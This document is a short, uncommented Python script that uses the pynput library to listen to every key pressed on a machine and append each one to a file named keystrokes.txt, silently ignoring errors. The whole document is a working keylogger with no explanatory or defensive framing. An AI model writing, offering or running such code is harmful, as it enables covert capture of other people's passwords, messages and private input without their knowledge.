from pynput import keyboard

def on_press(key):
    try:
        with open('keystrokes.txt', 'a') as f:
            f.write(str(key) + '\n')
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
